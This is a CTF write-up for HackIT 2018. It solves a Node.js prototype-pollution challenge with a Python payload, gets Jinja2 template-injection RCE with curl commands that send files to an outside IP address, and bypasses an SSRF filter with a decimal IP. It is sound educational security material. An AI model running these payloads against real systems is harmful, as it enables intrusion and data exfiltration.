# HackIT CTF 2018

**It's recommended to read our responsive [web version](https://balsn.github.io/ctf_writeup/20180908-hackitctf/) of this writeup.**


 - [HackIT CTF 2018](#hackit-ctf-2018)
   - [Welcome](#welcome)
     - [Get Going](#get-going)
   - [Web](#web)
     - [Republic of Gayming](#republic-of-gayming)
     - [Believer Case](#believer-case)
     - [PeeHPee2](#peehpee2)
   - [Reverse](#reverse)
     - [coffee_overflow](#coffee_overflow)


## Welcome

### Get Going 

(bookgin)

Actually, this should be a welcome challenge, but lots of teams find it not trivial. In the end the organizer releases 2 hints abount this welcome challenges, and directly indicates this is Zero Width Concept. lol 

The flag is encoded in Zero Width content with [zwsp-steg-js](https://github.com/offdev/zwsp-steg-js).

```
Welcome to the HackIT 2018 CTF, flag is somewhere here. ¯_(ツ)_/¯

flag{w3_gr337_h4ck3rz_w1th_un1c0d3}
```

## Web

### Republic of Gayming

(unsolved, written by bookgin, thanks @chmodxxx)

The source code:

```javascript
const express = require('express')
var hbs = require('hbs');
var bodyParser = require('body-parser');
const md5 = require('md5');
var morganBody = require('morgan-body');
const app = express();
var user = []; //empty for now

var matrix = [];
for (var i = 0; i < 3; i++){
	matrix[i] = [null , null, null];
}

function draw(mat) {
	var count = 0;
	for (var i = 0; i < 3; i++){
		for (var j = 0; j < 3; j++){
			if (matrix[i][j] !== null){
				count += 1;
			}
		}
	}
	return count === 9;
}

app.use('/static', express.static('static'));
app.use(bodyParser.json());
app.set('view engine', 'html');
morganBody(app);
app.engine('html', require('hbs').__express);

app.get('/', (req, res) => {

	for (var i = 0; i < 3; i++){
		matrix[i] = [null , null, null];

	}
	res.render('index');
})


app.get('/admin', (req, res) => { 
	/*this is under development I guess ??*/

	if(user.admintoken && req.query.querytoken && md5(user.admintoken) === req.query.querytoken){
		res.send('Hey admin your flag is <b>flag{redacted}</b>')
	} 
	else {
		res.status(403).send('Forbidden');
	}	
}
)


app.post('/api', (req, res) => {
	var client = req.body;
	var winner = null;
	matrix[client.row][client.col] = client.data;
	console.log(matrix);
	for(var i = 0; i < 3; i++){
		if (matrix[i][0] === matrix[i][1] && matrix[i][1] === matrix[i][2] ){
			if (matrix[i][0] === 'X') {
				winner = 1;
			}
			else if(matrix[i][0] === 'O') {
				winner = 2;
			}
		}
		if (matrix[0][i] === matrix[1][i] && matrix[1][i] === matrix[2][i]){
			if (matrix[0][i] === 'X') {
				winner = 1;
			}
			else if(matrix[0][i] === 'O') {
				winner = 2;
			}
		}
	}

	if (matrix[0][0] === matrix[1][1] && matrix[1][1] === matrix[2][2] && matrix[0][0] === 'X'){
		winner = 1;
	}
	if (matrix[0][0] === matrix[1][1] && matrix[1][1] === matrix[2][2] && matrix[0][0] === 'O'){
		winner = 2;
	} 

	if (matrix[0][2] === matrix[1][1] && matrix[1][1] === matrix[2][0] && matrix[2][0] === 'X'){
		winner = 1;
	}
	if (matrix[0][2] === matrix[1][1] && matrix[1][1] === matrix[2][0] && matrix[2][0] === 'O'){
		winner = 2;
	}

	if (draw(matrix) && winner === null){
		res.send(JSON.stringify({winner: 0}))
	}
	else if (winner !== null) {
		res.send(JSON.stringify({winner: winner}))
	}
	else {
		res.send(JSON.stringify({winner: -1}))
	}

})
app.listen(3000, () => {
	console.log('app listening on port 3000!')
})
```


The main objective is to pass the condition:
`if(user.admintoken && req.query.querytoken && md5(user.admintoken) === req.query.querytoken)`

However, `user = []` and there is no other operation which will modify the list. It seems impossible to pass this condition......

The most suspicious assignment is the operation of matrix, and we can control row,col and data.

```javascript
matrix[client.row][client.col] = client.data;
```

Ok but this is `matrix` not the `user` list. It has nothing to do with `user` list.

But you know, this is javascript. Everything can happen.

Take a look at [Javascript prototype pollution](https://github.com/HoLyVieR/prototype-pollution-nsec18/). The basic idea is to override/create a new attribute in the prototype. `matrix['__proto__']` is the prototype of javascript list. Leveraging this we can add the `admintoken` attribute to the list:

```javascript
matrix['__proto__']['admintoken'] = "helloworld";
```

The payload:

```python
#!/usr/bin/env python3
import requests
s = requests.session()
# leverage  matrix[row][col] = data
print(s.post('http://127.0.0.1:3000/api', json={'row':'__proto__','col':'admintoken', 'data':'helloworld'}).text)
# md5sum of 'hellworld'                                                                                                                  
print(s.get('http://127.0.0.1:3000/admin', params={"querytoken":"fc5e038d38a57032085441e7fe7010b0"}).text)
```

This is a very cool challenge. Although I didn't solve it, I learn a lot :)

### Believer Case

 (bookgin)

After a few testing we can quickly identify the vulnerabilty: Server Side Template Injection. `http://185.168.131.123/{{3*3}}` = 9

Next is to identify the backend. The error page of `http://185.168.131.123/a/b/c/` looks like Python Flask. Does the server use jinja2 to render the template?

Yes, it can be confirmed by `{{7*'7'}}` resulting 7777777. Refer to [this](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections#jinja2).

However, the server will filter some words like `mro`,`+`, `|`,`class` ...., which makes RCE  a little tricky.

We first try to use `g` (flask.ctx object) and `session` to result in RCE but cannot find anything useful. A quick Google we found [this problem](https://ctftime.org/task/6505) and some solution utilizes `url_for` (jinja2 function) to RCE.

So let's try `url_for.__globals__`, and we can see the `os` module is in the global!

RCE is trivial now:

```sh
# list files
http://185.168.131.123/{{url_for.__globals__.os.system("ls -all > /tmp/abc")}}
http://185.168.131.123/{{url_for.__globals__.os.system("curl 140.112.30.52:12345 -F data=@/tmp/abc")}}
# get the flag
http://185.168.131.123/{{url_for.__globals__.os.system("curl 140.112.30.52:12345 -F data=@flag_secret_file_910230912900891283")}}
```

(The reverse shell doesn't work:( so the solution is dirty. )

Here is the flag:

`flag{blacklists_are_insecure_even_if_you_do_not_know_the_bypass_friend_1023092813}`

### PeeHPee2 

(unsolved, written by bookgin, thanks to @chmodxxx)

The hint incicates the server is running Apache Struts 2.3.14, and provide a interface to fetch the url page.

But it's not so easy to SSRF. The server side filters some words like `.`,`localhost`, `::`.

We can bypass the filter using decimal IP `http://3114828676:1234/index.html`.

and then use [Struts 2.3.14 CVE](https://github.com/bhdresh/CVE-2018-11776) to send the payload to localhost.

[Offcial writeup](https://github.com/DefConUA/HackIT2018/tree/master/web/PeeHPee2)

## Reverse
### coffee_overflow

 (sasdf)
 
[A very lengthy writeup](https://github.com/sasdf/ctf-tasks-writeup/blob/master/writeup/2018/HackIT/coffee_overflow/README.md)
